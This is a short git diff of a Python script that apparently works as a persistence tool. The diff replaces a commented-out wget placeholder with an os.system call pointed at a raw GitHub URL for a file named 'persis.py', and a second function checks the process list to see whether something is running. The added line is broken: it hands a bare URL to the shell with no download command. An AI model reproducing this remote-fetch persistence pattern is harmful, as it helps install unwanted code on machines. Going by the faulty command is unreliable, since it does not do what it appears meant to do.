@@ -7,7 +7,7 @@ def birth():
         print("Script exists")
     else:
         os.system("cd ~/Desktop")
-    #os.system("wget URL")
+    os.system("https://raw.githubusercontent.com/thermaltp/class/master/persis.py")
 def working():
     running = os.popen("ps -elf").read()
     if exist in running:
